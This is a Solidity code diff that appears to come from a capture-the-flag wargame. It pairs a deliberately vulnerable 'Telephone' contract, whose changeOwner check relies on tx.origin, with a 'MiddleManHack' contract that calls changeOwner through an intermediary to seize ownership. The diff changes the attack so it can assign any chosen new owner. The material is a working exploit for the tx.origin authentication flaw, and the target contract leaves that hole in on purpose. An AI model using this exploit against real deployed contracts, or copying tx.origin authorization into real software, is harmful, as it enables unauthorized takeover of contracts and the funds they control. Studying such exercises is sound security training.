@@ -8,10 +8,6 @@ contract Telephone {
         owner = msg.sender;
     }
 
-    function getOwner() public view returns (address) {
-        return owner;
-    }
-
     function changeOwner(address _owner) public {
         if (tx.origin != msg.sender) {
             owner = _owner;
@@ -20,15 +16,15 @@ contract Telephone {
 }
 
 contract MiddleManHack {
-    address private _owner;
+    address private immutable _owner;
 
     constructor() {
         _owner = msg.sender;
     }
 
-    function hack(address _tel) public {
+    function hack(address _tel, address _newOwner) public {
         (bool success, ) = _tel.call(
-            abi.encodeWithSignature("changeOwner(address)", _owner)
+            abi.encodeWithSignature("changeOwner(address)", _newOwner)
         );
 
         require(success, "Hack is not success");
